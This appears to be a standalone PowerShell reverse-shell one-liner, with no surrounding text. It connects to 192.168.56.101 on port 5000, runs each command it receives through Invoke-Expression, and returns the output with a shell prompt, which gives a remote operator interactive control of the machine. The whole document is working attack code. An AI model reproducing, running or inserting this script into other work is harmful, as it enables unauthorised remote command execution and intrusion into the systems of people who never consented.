﻿$c = [Net.Sockets.TCPClient]::new('192.168.56.101',5000);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$c.Close()